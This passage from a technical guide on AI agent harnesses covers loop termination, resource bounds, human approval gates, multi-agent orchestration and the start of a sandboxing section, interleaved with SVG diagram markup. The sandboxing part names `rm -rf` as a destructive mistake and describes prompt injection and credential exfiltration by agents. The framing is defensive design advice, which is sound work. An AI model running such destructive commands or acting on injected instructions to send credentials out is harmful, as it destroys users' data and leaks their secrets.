<text x="456.0" y="7.0" font-size="9" fill="#6b7a90" text-anchor="middle" font-weight="normal">production feedback returns to planning</text>
<text x="138.0" y="72.0" font-size="8" fill="#6b7a90" text-anchor="middle" font-weight="700">WHERE IT SITS IN THE HARNESS</text>
<path d="M173.3 208.5 L292 64 L292 252 L173.3 208.5 Z" fill="#FF9900" opacity="0.10"/>
<line x1="173.3" y1="208.5" x2="292" y2="64" stroke="#FF9900" stroke-width="1" stroke-dasharray="3 3" opacity="0.7"/>
<line x1="173.3" y1="208.5" x2="292" y2="252" stroke="#FF9900" stroke-width="1" stroke-dasharray="3 3" opacity="0.7"/>
<path d="M119.1 98.9 A64 64 0 0 1 156.9 98.9 L146.9 131.3 A30 30 0 0 0 129.1 131.3 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="138.0" y="87.5" font-size="9.5" fill="#44546f" text-anchor="middle" font-weight="normal">3 Tools</text>
<path d="M158.6 99.4 A64 64 0 0 1 189.2 121.7 L162.0 142.0 A30 30 0 0 0 147.7 131.6 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="180.9" y="104.4" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">4 Context</text>
<path d="M190.3 123.1 A64 64 0 0 1 202.0 159.1 L168.0 159.6 A30 30 0 0 0 162.5 142.7 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="207.4" y="140.9" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">5 Caching</text>
<path d="M202.0 160.9 A64 64 0 0 1 190.3 196.9 L162.5 177.3 A30 30 0 0 0 168.0 160.4 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="207.4" y="186.1" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">6 Memory</text>
<path d="M189.2 198.3 A64 64 0 0 1 158.6 220.6 L147.7 188.4 A30 30 0 0 0 162.0 178.0 Z" fill="#FF9900" stroke="#ffffff" stroke-width="1.6"/>
<text x="180.9" y="222.6" font-size="9.5" fill="#1a1a2e" text-anchor="start" font-weight="700">7 Bounds</text>
<path d="M156.9 221.1 A64 64 0 0 1 119.1 221.1 L129.1 188.7 A30 30 0 0 0 146.9 188.7 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="138.0" y="241.5" font-size="9.5" fill="#44546f" text-anchor="middle" font-weight="normal">8 Agents</text>
<path d="M117.4 220.6 A64 64 0 0 1 86.8 198.3 L114.0 178.0 A30 30 0 0 0 128.3 188.4 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="95.1" y="222.6" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">9 Sandbox</text>
<path d="M85.7 196.9 A64 64 0 0 1 74.0 160.9 L108.0 160.4 A30 30 0 0 0 113.5 177.3 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="68.6" y="186.1" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">10 Evals</text>
<path d="M74.0 159.1 A64 64 0 0 1 85.7 123.1 L113.5 142.7 A30 30 0 0 0 108.0 159.6 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="68.6" y="140.9" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">11 Cost</text>
<path d="M86.8 121.7 A64 64 0 0 1 117.4 99.4 L128.3 131.6 A30 30 0 0 0 114.0 142.0 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="95.1" y="104.4" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">12 Observe</text>
<circle cx="138.0" cy="160.0" r="27" fill="#232F3E"/>
<text x="138.0" y="159.0" font-size="8.5" fill="#ffffff" text-anchor="middle" font-weight="700">2 Core</text>
<text x="138.0" y="169.0" font-size="8.5" fill="#ffffff" text-anchor="middle" font-weight="700">loop</text>
<rect x="292.0" y="62.0" width="620.0" height="192.0" rx="8" fill="#f8f9fb" stroke="#dfe1e6" stroke-width="1.2"/>
<text x="308.0" y="82.0" font-size="11.5" fill="#1a1a2e" text-anchor="start" font-weight="700">Three ways out of the loop, and one gate</text>
<path d="M506.0 138.8 A36.0 36.0 0 1 1 475.7 136.2" fill="none" stroke="#232F3E" stroke-width="2.2" marker-end="url(#c7-d)"/>
<text x="488.0" y="174.0" font-size="11" fill="#1a1a2e" text-anchor="middle" font-weight="700">loop</text>
<rect x="316.0" y="100.0" width="120.0" height="26.0" rx="5" fill="#fffae6" stroke="#f5c56b" stroke-width="1.2"/>
<text x="376.0" y="116.2" font-size="9" fill="#1a1a2e" text-anchor="middle" font-weight="600">Destructive tool call</text>
<path d="M376.0 145.0 L413.0 170.0 L376.0 195.0 L339.0 170.0 Z" fill="#fffae6" stroke="#f5c56b" stroke-width="1.2"/>
<text x="376.0" y="167.0" font-size="8.5" fill="#1a1a2e" text-anchor="middle" font-weight="600">approve,</text>
<text x="376.0" y="178.0" font-size="8.5" fill="#1a1a2e" text-anchor="middle" font-weight="600">edit, reject</text>
<line x1="376.0" y1="128.0" x2="376.0" y2="143.0" stroke="#FF9900" stroke-width="1.4" marker-end="url(#c7-o)"/>
<line x1="414.0" y1="170.0" x2="448.0" y2="170.0" stroke="#232F3E" stroke-width="1.4" marker-end="url(#c7-d)"/>
<line x1="376.0" y1="196.0" x2="376.0" y2="220.0" stroke="#de350b" stroke-width="1.4" marker-end="url(#c7-r)"/>
<text x="376.0" y="236.0" font-size="9" fill="#de350b" text-anchor="middle" font-weight="600">reject: call blocked</text>
<rect x="590.0" y="100.0" width="180.0" height="32.0" rx="5" fill="#e3fcef" stroke="#1e7e34" stroke-width="1.2"/>
<text x="680.0" y="114.5" font-size="10" fill="#1e7e34" text-anchor="middle" font-weight="600">finish tool</text>
<text x="680.0" y="126.0" font-size="8.5" fill="#1e7e34" text-anchor="middle" font-weight="normal">states reason and output paths</text>
<rect x="590.0" y="150.0" width="180.0" height="32.0" rx="5" fill="#e3fcef" stroke="#1e7e34" stroke-width="1.2"/>
<text x="680.0" y="164.5" font-size="10" fill="#1e7e34" text-anchor="middle" font-weight="600">no tool calls</text>
<text x="680.0" y="176.0" font-size="8.5" fill="#1e7e34" text-anchor="middle" font-weight="normal">nothing left to execute</text>
<rect x="590.0" y="204.0" width="180.0" height="32.0" rx="5" fill="#ffebe6" stroke="#de350b" stroke-width="1.2"/>
<text x="680.0" y="218.5" font-size="10" fill="#de350b" text-anchor="middle" font-weight="600">a limit fires</text>
<text x="680.0" y="230.0" font-size="8.5" fill="#de350b" text-anchor="middle" font-weight="normal">turns, tokens, time, cost, depth</text>
<line x1="518.6" y1="144.3" x2="587.0" y2="116.0" stroke="#1e7e34" stroke-width="1.4" marker-end="url(#c7-gr)"/>
<line x1="528.0" y1="170.0" x2="587.0" y2="166.0" stroke="#1e7e34" stroke-width="1.4" marker-end="url(#c7-gr)"/>
<line x1="518.6" y1="195.7" x2="587.0" y2="220.0" stroke="#de350b" stroke-width="1.4" marker-end="url(#c7-r)"/>
<rect x="800.0" y="104.0" width="92.0" height="74.0" rx="5" fill="#e3fcef" stroke="#1e7e34" stroke-width="1.2"/>
<text x="846.0" y="145.0" font-size="11" fill="#1e7e34" text-anchor="middle" font-weight="600">Done</text>
<line x1="773.0" y1="116.0" x2="797.0" y2="128.0" stroke="#1e7e34" stroke-width="1.4" marker-end="url(#c7-gr)"/>
<line x1="773.0" y1="166.0" x2="797.0" y2="154.0" stroke="#1e7e34" stroke-width="1.4" marker-end="url(#c7-gr)"/>
<rect x="800.0" y="204.0" width="92.0" height="32.0" rx="5" fill="#ffebe6" stroke="#de350b" stroke-width="1.2"/>
<text x="846.0" y="224.0" font-size="11" fill="#de350b" text-anchor="middle" font-weight="600">Abort</text>
<line x1="772.5" y1="220.0" x2="797.5" y2="220.0" stroke="#de350b" stroke-width="1.4" marker-end="url(#c7-r)"/>
</svg>
</div>

### 7.1 How the loop ends

Three mechanisms exist, and a harness uses all three. The model can declare completion by calling a `finish` tool. The harness can detect completion, because the model returned text with no tool calls and there is nothing left to execute. Or a limit fires, such as a maximum number of turns.

A `finish` tool beats the no-tool-calls rule for one reason. It gives the model somewhere to state what it accomplished and which files it produced. Give its parameters a reason string and a list of output paths, and let the harness copy those paths out of the execution environment.

### 7.2 What to bound

Bound the turn count so the loop cannot run forever, and the tool call count so a single turn cannot fan out to a thousand calls. Bound the context size so a request cannot exceed the model's window, and bound output tokens per response separately from that context budget. Bound the tool timeout so one hung command cannot stall the run, bound cost per session and enforce it rather than estimating it, and bound recursion depth if subagents can spawn subagents.

The output token bound needs care. Keep the response budget separate from the context budget, and reject a response budget that exceeds the window. When a response hits its budget, abort the run rather than retry it. A silent retry on a too-small response budget burns money and produces nothing.

### 7.3 Human confirmation

Put a checkpoint on destructive actions rather than on every read. A modal on every file read trains the user to click through everything, which defeats the purpose. Interrupt on named tools and offer approve, edit, or reject. The edit option matters, because the user can fix a bad argument instead of only blocking the call.

Supporting frameworks: AgentCore (A.2), KiroCrew (A.3), LangChain (A.5), OpenAI (A.6), Stirrup (A.7).

---

## 8. Multi-agent orchestration

Start with one agent and one loop, and add a second agent only when the first hits a ceiling you can name. A multi-agent system carries the complexity of a microservice architecture plus non-determinism. You inherit the distributed-systems failures and lose the ability to reproduce them. A single loop handles one task, and most work fits inside that.

<div class="figure">
<svg viewBox="0 0 912 262" xmlns="http://www.w3.org/2000/svg" role="img">
<defs><marker id="c8-g" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#8a96a8"/></marker><marker id="c8-o" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#FF9900"/></marker><marker id="c8-b" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#0052CC"/></marker><marker id="c8-r" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#de350b"/></marker><marker id="c8-gr" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#1e7e34"/></marker><marker id="c8-d" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#232F3E"/></marker></defs>
<polygon points="0.0,18.0 111.0,18.0 121.0,32.0 111.0,46.0 0.0,46.0" fill="#FF9900"/>
<text x="55.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Plan</text>
<path d="M50.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="114.0,18.0 225.0,18.0 235.0,32.0 225.0,46.0 114.0,46.0 124.0,32.0" fill="#FF9900"/>
<text x="169.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Specify</text>
<path d="M164.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="228.0,18.0 339.0,18.0 349.0,32.0 339.0,46.0 228.0,46.0 238.0,32.0" fill="#FF9900"/>
<text x="283.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Build</text>
<path d="M278.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="342.0,18.0 453.0,18.0 463.0,32.0 453.0,46.0 342.0,46.0 352.0,32.0" fill="#FF9900"/>
<text x="397.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Test</text>
<path d="M392.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="456.0,18.0 567.0,18.0 577.0,32.0 567.0,46.0 456.0,46.0 466.0,32.0" fill="#FF9900"/>
<text x="511.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Verify</text>
<path d="M506.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="570.0,18.0 681.0,18.0 691.0,32.0 681.0,46.0 570.0,46.0 580.0,32.0" fill="#edf0f4"/>
<text x="625.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Deploy</text>
<polygon points="684.0,18.0 795.0,18.0 805.0,32.0 795.0,46.0 684.0,46.0 694.0,32.0" fill="#edf0f4"/>
<text x="739.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Eval</text>
<polygon points="798.0,18.0 909.0,18.0 919.0,32.0 909.0,46.0 798.0,46.0 808.0,32.0" fill="#edf0f4"/>
<text x="853.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Operate</text>
<path d="M853.5 17.0 C853.5 -1.0 55.5 -1.0 55.5 17.0" fill="none" stroke="#8a96a8" stroke-width="1.2" stroke-dasharray="4 3" marker-end="url(#c8-g)"/>
<rect x="338.0" y="-2.0" width="236.0" height="12.0" rx="2" fill="#ffffff" stroke="none" stroke-width="1.2"/>
<text x="456.0" y="7.0" font-size="9" fill="#6b7a90" text-anchor="middle" font-weight="normal">production feedback returns to planning</text>
<text x="138.0" y="72.0" font-size="8" fill="#6b7a90" text-anchor="middle" font-weight="700">WHERE IT SITS IN THE HARNESS</text>
<path d="M138.0 220.0 L292 64 L292 252 L138.0 220.0 Z" fill="#FF9900" opacity="0.10"/>
<line x1="138.0" y1="220.0" x2="292" y2="64" stroke="#FF9900" stroke-width="1" stroke-dasharray="3 3" opacity="0.7"/>
<line x1="138.0" y1="220.0" x2="292" y2="252" stroke="#FF9900" stroke-width="1" stroke-dasharray="3 3" opacity="0.7"/>
<path d="M119.1 98.9 A64 64 0 0 1 156.9 98.9 L146.9 131.3 A30 30 0 0 0 129.1 131.3 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="138.0" y="87.5" font-size="9.5" fill="#44546f" text-anchor="middle" font-weight="normal">3 Tools</text>
<path d="M158.6 99.4 A64 64 0 0 1 189.2 121.7 L162.0 142.0 A30 30 0 0 0 147.7 131.6 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="180.9" y="104.4" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">4 Context</text>
<path d="M190.3 123.1 A64 64 0 0 1 202.0 159.1 L168.0 159.6 A30 30 0 0 0 162.5 142.7 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="207.4" y="140.9" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">5 Caching</text>
<path d="M202.0 160.9 A64 64 0 0 1 190.3 196.9 L162.5 177.3 A30 30 0 0 0 168.0 160.4 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="207.4" y="186.1" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">6 Memory</text>
<path d="M189.2 198.3 A64 64 0 0 1 158.6 220.6 L147.7 188.4 A30 30 0 0 0 162.0 178.0 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="180.9" y="222.6" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">7 Bounds</text>
<path d="M156.9 221.1 A64 64 0 0 1 119.1 221.1 L129.1 188.7 A30 30 0 0 0 146.9 188.7 Z" fill="#FF9900" stroke="#ffffff" stroke-width="1.6"/>
<text x="138.0" y="241.5" font-size="9.5" fill="#1a1a2e" text-anchor="middle" font-weight="700">8 Agents</text>
<path d="M117.4 220.6 A64 64 0 0 1 86.8 198.3 L114.0 178.0 A30 30 0 0 0 128.3 188.4 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="95.1" y="222.6" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">9 Sandbox</text>
<path d="M85.7 196.9 A64 64 0 0 1 74.0 160.9 L108.0 160.4 A30 30 0 0 0 113.5 177.3 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="68.6" y="186.1" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">10 Evals</text>
<path d="M74.0 159.1 A64 64 0 0 1 85.7 123.1 L113.5 142.7 A30 30 0 0 0 108.0 159.6 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="68.6" y="140.9" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">11 Cost</text>
<path d="M86.8 121.7 A64 64 0 0 1 117.4 99.4 L128.3 131.6 A30 30 0 0 0 114.0 142.0 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="95.1" y="104.4" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">12 Observe</text>
<circle cx="138.0" cy="160.0" r="27" fill="#232F3E"/>
<text x="138.0" y="159.0" font-size="8.5" fill="#ffffff" text-anchor="middle" font-weight="700">2 Core</text>
<text x="138.0" y="169.0" font-size="8.5" fill="#ffffff" text-anchor="middle" font-weight="700">loop</text>
<rect x="292.0" y="62.0" width="620.0" height="192.0" rx="8" fill="#f8f9fb" stroke="#dfe1e6" stroke-width="1.2"/>
<text x="308.0" y="82.0" font-size="11.5" fill="#1a1a2e" text-anchor="start" font-weight="700">A scheduler, parallel reads, serial writes, and three roles</text>
<rect x="316.0" y="146.0" width="120.0" height="40.0" rx="5" fill="#232F3E" stroke="#232F3E" stroke-width="1.2"/>
<text x="376.0" y="164.5" font-size="10" fill="#ffffff" text-anchor="middle" font-weight="600">Main context</text>
<text x="376.0" y="176.0" font-size="8.5" fill="#c9d2de" text-anchor="middle" font-weight="normal">plan, decisions, results</text>
<text x="480.0" y="104.0" font-size="8" fill="#6b7a90" text-anchor="start" font-weight="700">READS FAN OUT</text>
<rect x="480.0" y="110.0" width="110.0" height="20.0" rx="5" fill="#e6f0ff" stroke="#b3d4ff" stroke-width="1.2"/>
<text x="535.0" y="123.2" font-size="9" fill="#1a1a2e" text-anchor="middle" font-weight="600">search</text>
<line x1="438.0" y1="160.0" x2="477.0" y2="120.0" stroke="#0052CC" stroke-width="1.4" marker-end="url(#c8-b)"/>
<rect x="480.0" y="134.0" width="110.0" height="20.0" rx="5" fill="#e6f0ff" stroke="#b3d4ff" stroke-width="1.2"/>
<text x="535.0" y="147.2" font-size="9" fill="#1a1a2e" text-anchor="middle" font-weight="600">code analysis</text>
<line x1="438.0" y1="160.0" x2="477.0" y2="144.0" stroke="#0052CC" stroke-width="1.4" marker-end="url(#c8-b)"/>
<rect x="480.0" y="158.0" width="110.0" height="20.0" rx="5" fill="#e6f0ff" stroke="#b3d4ff" stroke-width="1.2"/>
<text x="535.0" y="171.2" font-size="9" fill="#1a1a2e" text-anchor="middle" font-weight="600">test runs</text>
<line x1="438.0" y1="160.0" x2="477.0" y2="168.0" stroke="#0052CC" stroke-width="1.4" marker-end="url(#c8-b)"/>
<text x="480.0" y="200.0" font-size="8" fill="#6b7a90" text-anchor="start" font-weight="700">WRITES SERIALIZE</text>
<rect x="452.0" y="211.0" width="16.0" height="5.0" rx="1" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<rect x="452.0" y="218.0" width="16.0" height="5.0" rx="1" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<rect x="452.0" y="225.0" width="16.0" height="5.0" rx="1" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<line x1="430.0" y1="188.0" x2="450.0" y2="212.0" stroke="#FF9900" stroke-width="1.4" marker-end="url(#c8-o)"/>
<rect x="480.0" y="210.0" width="122.0" height="22.0" rx="5" fill="#fffae6" stroke="#f5c56b" stroke-width="1.2"/>
<text x="541.0" y="224.2" font-size="9" fill="#1a1a2e" text-anchor="middle" font-weight="600">one writer at a time</text>
<rect x="660.0" y="98.0" width="150.0" height="30.0" rx="5" fill="#232F3E" stroke="#232F3E" stroke-width="1.2"/>
<text x="735.0" y="111.5" font-size="10" fill="#ffffff" text-anchor="middle" font-weight="600">Planner</text>
<text x="735.0" y="123.0" font-size="8.5" fill="#c9d2de" text-anchor="middle" font-weight="normal">Plan, Specify</text>
<rect x="660.0" y="150.0" width="150.0" height="30.0" rx="5" fill="#232F3E" stroke="#232F3E" stroke-width="1.2"/>
<text x="735.0" y="163.5" font-size="10" fill="#ffffff" text-anchor="middle" font-weight="600">Generator</text>
<text x="735.0" y="175.0" font-size="8.5" fill="#c9d2de" text-anchor="middle" font-weight="normal">Build</text>
<rect x="660.0" y="202.0" width="150.0" height="30.0" rx="5" fill="#232F3E" stroke="#232F3E" stroke-width="1.2"/>
<text x="735.0" y="215.5" font-size="10" fill="#ffffff" text-anchor="middle" font-weight="600">Evaluator</text>
<text x="735.0" y="227.0" font-size="8.5" fill="#c9d2de" text-anchor="middle" font-weight="normal">Test, Review</text>
<line x1="622.0" y1="113.0" x2="657.0" y2="113.0" stroke="#8a96a8" stroke-width="1.4" marker-end="url(#c8-g)"/>
<text x="640.0" y="107.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="normal">prompt</text>
<line x1="735.0" y1="128.0" x2="735.0" y2="132.0" stroke="#8a96a8" stroke-width="1.4"/>
<path d="M735.0 133.0 L741.0 139.0 L735.0 145.0 L729.0 139.0 Z" fill="#FF9900" stroke="#FF9900" stroke-width="1.2"/>
<line x1="735.0" y1="145.0" x2="735.0" y2="147.5" stroke="#8a96a8" stroke-width="1.4" marker-end="url(#c8-g)"/>
<text x="748.0" y="142.5" font-size="8.5" fill="#9a5b00" text-anchor="start" font-weight="600">schema check</text>
<line x1="735.0" y1="180.0" x2="735.0" y2="184.0" stroke="#8a96a8" stroke-width="1.4"/>
<path d="M735.0 185.0 L741.0 191.0 L735.0 197.0 L729.0 191.0 Z" fill="#FF9900" stroke="#FF9900" stroke-width="1.2"/>
<line x1="735.0" y1="197.0" x2="735.0" y2="199.5" stroke="#8a96a8" stroke-width="1.4" marker-end="url(#c8-g)"/>
<text x="748.0" y="194.5" font-size="8.5" fill="#9a5b00" text-anchor="start" font-weight="600">schema check</text>
<path d="M658 217 C626 217 626 165 657 165" fill="none" stroke="#de350b" stroke-width="1.4" stroke-dasharray="4 3" marker-end="url(#c8-r)"/>
<text x="622.0" y="194.0" font-size="8.5" fill="#de350b" text-anchor="end" font-weight="600">feedback</text>
<rect x="832.0" y="204.0" width="62.0" height="26.0" rx="5" fill="#e3fcef" stroke="#1e7e34" stroke-width="1.2"/>
<text x="863.0" y="220.2" font-size="9" fill="#1e7e34" text-anchor="middle" font-weight="600">Accepted</text>
<line x1="812.0" y1="217.0" x2="829.0" y2="217.0" stroke="#1e7e34" stroke-width="1.4" marker-end="url(#c8-gr)"/>
</svg>
</div>

The first pattern to add is subagent dispatch. The main agent hands a scoped subtask to a subagent, which runs in its own context and returns a compact result. Ask a subagent where authentication lives in a codebase, and it absorbs the search noise while the main agent sees only the answer. Two details decide whether dispatch holds up. If the subagent produces files, the parent needs an execution environment for them to land in. The transfer must also report every file that failed, so the parent never relies on one that did not arrive. Subagents can call subagents, so bound the depth.

Once subagents exist, treat the main context as a scheduler rather than a workspace. Filesystem search, code analysis, test runs, and summarization go to subagents, and each returns a summary instead of raw output. The main context keeps the plan, the decisions, and the results. Load the plan and the specification on every iteration, so the agent reasons from a fixed foundation rather than from whatever survived the last compaction. Instruct the agent to search before it implements anything. Code search is non-deterministic and a miss looks the same as an absence, so an agent that skips the search writes a second copy of code you already have.

Parallelism is asymmetric. Fan out reads aggressively, because ten parallel searches cost ten cheap calls and finish in the time of the slowest. Keep write concurrency low, because parallel builds, test runs, and file edits compete for the same resources and corrupt each other's state. A small write concurrency usually finishes sooner end to end than a large one.

When one loop stops being enough, split the work into three roles. A planner expands a short prompt into a specification, which prevents building the wrong thing. A generator implements one feature at a time against that specification, which prevents doing everything at once. An evaluator tests the running system the way a user does and grades it against criteria, which stops the agent from marking broken work complete. Keep the planner at the level of product context and high-level design. A plan that specifies implementation up front locks in decisions made with the least information you will ever have, and every downstream step inherits the errors. Section 10 explains why the evaluator earns its cost.

The handoff between roles is where a multi-agent system loses fidelity. Define the handoff payload as a schema rather than prose, and enforce one rule at every boundary: unverified data does not pass downstream. If the planner invents a requirement and the handoff carries it forward, the generator spends a full session on work nobody asked for. A check at the boundary costs far less than that session.

Graph orchestration models the flow as nodes, conditional edges, and a typed state object. It earns its complexity when the flow is a real state machine with states you can name. It also earns it when you need checkpoints, resumable runs, or human approval at fixed points. It is the wrong shape for most tasks, which are one loop with tool calls. Do not use a graph to improve accuracy. In [AWS measurements](https://strandsagents.com/blog/steering-accuracy-beats-prompts-workflows/) of 600 runs per approach, hooks that correct the model during a run passed 100% of cases, against 80.8% for a graph workflow and 82.5% for prompt instructions.

Critique is a low-cost quality check. After the agent produces an answer, a second pass grades it against a rubric and can trigger a fix. Run the critic in a fresh context that holds only the artifact and the rubric, because a critic that shares the author's context shares the author's blind spots. When agents run in different processes or belong to different teams, an in-process call no longer works. Treat the agent-to-agent protocol as a service boundary and give it the same care as any other remote call.

Grow the system in the order the symptoms appear. Add subagents when exploration noise fills the main context. Add an evaluator when the agent marks broken work complete, and a planner when it builds the wrong thing from a short prompt. Add parallel fan-out when latency is the problem and the work splits cleanly. Add a graph when you need resumability or approval gates, and a network protocol only when the agents cannot share a process.

Supporting frameworks: Strands (A.1), AgentCore (A.2), KiroCrew (A.3), LangChain (A.5), OpenAI (A.6), Stirrup (A.7).

---

## 9. Sandboxing and isolation

An agent that can run shell commands can delete your work, leak your credentials, and send your source code to an outside service. Treat sandboxing as a requirement, and start the design by naming the threats, because each one needs its own control. Mistakes, such as `rm -rf` on the wrong path, need a filesystem boundary. Prompt injection, where content the agent reads carries instructions that the agent follows, needs a network boundary and a credential boundary. Credential theft, where the agent reads a key from its environment and sends it out, needs credentials that the agent never holds. Most sandboxes address mistakes and stop there. That leaves the larger risk open, because a coding agent reads untrusted input all day in dependency READMEs, log files, and web pages.

<div class="figure">
<svg viewBox="0 0 912 262" xmlns="http://www.w3.org/2000/svg" role="img">
<defs><marker id="c9-g" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#8a96a8"/></marker><marker id="c9-o" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#FF9900"/></marker><marker id="c9-b" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#0052CC"/></marker><marker id="c9-r" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#de350b"/></marker><marker id="c9-gr" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#1e7e34"/></marker><marker id="c9-d" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#232F3E"/></marker></defs>
<polygon points="0.0,18.0 111.0,18.0 121.0,32.0 111.0,46.0 0.0,46.0" fill="#edf0f4"/>
<text x="55.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Plan</text>
<polygon points="114.0,18.0 225.0,18.0 235.0,32.0 225.0,46.0 114.0,46.0 124.0,32.0" fill="#edf0f4"/>
<text x="169.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Specify</text>
<polygon points="228.0,18.0 339.0,18.0 349.0,32.0 339.0,46.0 228.0,46.0 238.0,32.0" fill="#FF9900"/>
<text x="283.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Build</text>
<path d="M278.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="342.0,18.0 453.0,18.0 463.0,32.0 453.0,46.0 342.0,46.0 352.0,32.0" fill="#FF9900"/>
<text x="397.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Test</text>
<path d="M392.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="456.0,18.0 567.0,18.0 577.0,32.0 567.0,46.0 456.0,46.0 466.0,32.0" fill="#edf0f4"/>
<text x="511.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Verify</text>
<polygon points="570.0,18.0 681.0,18.0 691.0,32.0 681.0,46.0 570.0,46.0 580.0,32.0" fill="#FF9900"/>
<text x="625.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Deploy</text>
<path d="M620.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="684.0,18.0 795.0,18.0 805.0,32.0 795.0,46.0 684.0,46.0 694.0,32.0" fill="#edf0f4"/>
<text x="739.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Eval</text>
<polygon points="798.0,18.0 909.0,18.0 919.0,32.0 909.0,46.0 798.0,46.0 808.0,32.0" fill="#edf0f4"/>
<text x="853.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Operate</text>
<path d="M853.5 17.0 C853.5 -1.0 55.5 -1.0 55.5 17.0" fill="none" stroke="#8a96a8" stroke-width="1.2" stroke-dasharray="4 3" marker-end="url(#c9-g)"/>
